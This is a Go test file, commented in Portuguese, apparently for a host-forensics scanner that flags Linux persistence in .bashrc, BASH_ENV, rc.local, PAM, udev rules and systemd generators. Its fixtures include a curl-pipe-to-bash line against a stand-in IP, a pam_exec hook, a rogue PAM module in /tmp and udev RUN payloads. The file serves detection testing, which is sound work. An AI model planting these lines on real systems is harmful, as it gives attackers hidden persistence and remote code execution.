package checks

import (
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/check"
	"github.com/lex0c/aletheia/internal/facts"
)

func trig(kind, file, when string, linhas ...facts.TriggerLine) facts.Trigger {
	return facts.Trigger{File: file, Kind: kind, When: when, Lines: linhas, Exec: true}
}

func tl(n int, texto string) facts.TriggerLine { return facts.TriggerLine{N: n, Text: texto} }

// O que a §7.6 dá de graça: o esqueleto é o baseline, e o fim do arquivo é onde
// o append cai. As duas informações entram na evidência.
func TestShellStartupUsaSkelEPosicao(t *testing.T) {
	l := facts.TriggerLine{N: 90, Text: "curl -s http://198.51.100.7/a | bash",
		Added: true, Tail: true}
	f := &facts.Facts{Triggers: []facts.Trigger{
		trig("shell", "/home/app/.bashrc", "shell INTERATIVO — a cada login SSH", l)}}
	f.Triggers[0].User = "app"

	r := shellStartup.Run(shellStartup, f, imgEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevCritical {
		t.Fatalf("achados = %v", r.Findings)
	}
	ev := strings.Join(r.Findings[0].Evidence, " ")
	for _, quer := range []string{"NÃO existe em /etc/skel", "FIM do arquivo",
		"QUANDO roda: shell INTERATIVO"} {
		if !strings.Contains(ev, quer) {
			t.Errorf("falta %q:\n%s", quer, ev)
		}
	}
}

// BASH_ENV é lido por shell NÃO interativo — script, cron, scp. Não passa por
// login nenhum, e é por isso que sobrevive à limpeza dos arquivos óbvios.
func TestBashEnv(t *testing.T) {
	f := &facts.Facts{Triggers: []facts.Trigger{
		trig("shell", "/home/app/.bashrc", "interativo",
			tl(3, `export BASH_ENV=/tmp/.x`),
			tl(4, `export EDITOR=vim`)),
	}}
	r := bashEnv.Run(bashEnv, f, imgEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevCritical {
		t.Fatalf("achados = %v", r.Findings)
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "NÃO interativo") {
		t.Error("o achado precisa dizer POR QUE isto escapa: não passa por login")
	}
}

// rc.local sem bit de execução é INERTE. Reportar como crítico algo que não
// roda desperdiça a atenção do operador — mas some-lo também erra, porque um
// chmod +x o ativa.
func TestRcLocalSemBitDeExecucaoEhAvisoENaoCritico(t *testing.T) {
	mk := func(exec bool) *facts.Facts {
		tr := trig("rc", "/etc/rc.local", "no BOOT", tl(2, "/tmp/.x &"))
		tr.Exec, tr.Modo = exec, "-rw-r--r--"
		return &facts.Facts{Triggers: []facts.Trigger{tr}}
	}
	r := triggerExec.Run(triggerExec, mk(false), imgEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevWarn {
		t.Fatalf("sem bit de execução devia ser aviso: %v", r.Findings)
	}
	if !strings.Contains(strings.Join(r.Findings[0].Evidence, " "), "INERTE") {
		t.Error("a evidência precisa dizer que hoje não roda")
	}
	if r := triggerExec.Run(triggerExec, mk(true), imgEnv()); r.Findings[0].Sev != check.SevCritical {
		t.Error("com bit de execução, roda no boot: é crítico")
	}
}

func TestModuloPAM(t *testing.T) {
	casos := []struct{ linha, modulo, args string }{
		{"auth optional pam_exec.so /tmp/.x", "pam_exec.so", "/tmp/.x"},
		// o controle pode vir entre colchetes COM espaços: cortar por espaço
		// faria o módulo virar um pedaço do controle
		{"auth [success=1 default=ignore] pam_unix.so nullok", "pam_unix.so", "nullok"},
		{"session required /tmp/evil.so", "/tmp/evil.so", ""},
	}
	for _, c := range casos {
		m, a, ok := moduloPAM(c.linha)
		if !ok || m != c.modulo || a != c.args {
			t.Errorf("moduloPAM(%q) = %q,%q,%v — quer %q,%q", c.linha, m, a, ok, c.modulo, c.args)
		}
	}
}

func TestPamExecEModuloForaDoLugar(t *testing.T) {
	f := &facts.Facts{Triggers: []facts.Trigger{
		trig("pam", "/etc/pam.d/sshd", "a cada autenticação",
			tl(1, "auth optional pam_exec.so /tmp/.notify"),
			tl(2, "session required /tmp/evil.so"),
			tl(3, "auth required pam_unix.so")),
	}}
	r := pamExec.Run(pamExec, f, imgEnv())
	if len(r.Findings) != 2 {
		t.Fatalf("achados = %d, quer 2 (pam_exec e módulo fora do lugar)", len(r.Findings))
	}
	todos := strings.Join(append(r.Findings[0].Evidence, r.Findings[1].Evidence...), " ")
	if !strings.Contains(todos, "fora dos diretórios de segurança") {
		t.Error("módulo de /tmp precisa ser dito como fora do lugar")
	}
}

func TestProgramaUdev(t *testing.T) {
	casos := map[string]string{
		`ACTION=="add", RUN+="/tmp/.x"`:                  "/tmp/.x",
		`SUBSYSTEM=="net", PROGRAM="/usr/bin/legit arg"`: "/usr/bin/legit arg",
		`RUN{program}+="/dev/shm/a"`:                     "/dev/shm/a",
		`ACTION=="add", SYMLINK+="disk/by-id/x"`:         "",
	}
	for ln, quer := range casos {
		got, ok := programaUdev(ln)
		if quer == "" {
			if ok {
				t.Errorf("programaUdev(%q) achou %q onde não há RUN/PROGRAM", ln, got)
			}
			continue
		}
		if !ok || got != quer {
			t.Errorf("programaUdev(%q) = %q,%v — quer %q", ln, got, ok, quer)
		}
	}
}

// A guarda que impediu o /etc/profile.d/gpm.sh de qualquer Arch de virar
// achado: em linha de SHELL o primeiro token pode ser sintaxe, não programa.
func TestPadraoDeShellNaoEhCaminhoDeExecutavel(t *testing.T) {
	naoSao := []string{
		`/dev/tty[0-9]*)`, // padrão de case
		`/usr/bin/*`,      // glob
		`/tmp/$(id -u)`,   // substituição
		`/etc/foo|bar`,    // pipe
		"relativo/x",      // não é absoluto
	}
	for _, s := range naoSao {
		if pareceCaminho(s) {
			t.Errorf("pareceCaminho(%q) = true, mas isso é sintaxe de shell", s)
		}
	}
	for _, s := range []string{"/tmp/.x", "/usr/local/sbin/svc", "/dev/shm/a.bin"} {
		if !pareceCaminho(s) {
			t.Errorf("pareceCaminho(%q) = false, mas é caminho de verdade", s)
		}
	}
}

// Generator costuma ser ELF, e fatiar um binário em linhas produz texto que
// PARECE configuração — o systemd-debug-generator tem `TTYPath=/dev/%s` no
// meio do código.
func TestGatilhoBinarioNaoTemLinhaParaAvaliar(t *testing.T) {
	tr := trig("generator", "/usr/lib/systemd/system-generators/x", "no boot")
	tr.Binario, tr.Lines = true, nil
	f := &facts.Facts{Triggers: []facts.Trigger{tr}}
	if r := triggerExec.Run(triggerExec, f, imgEnv()); len(r.Findings) != 0 {
		t.Errorf("binário não pode produzir achado de texto: %v", r.Findings[0].Evidence)
	}
}
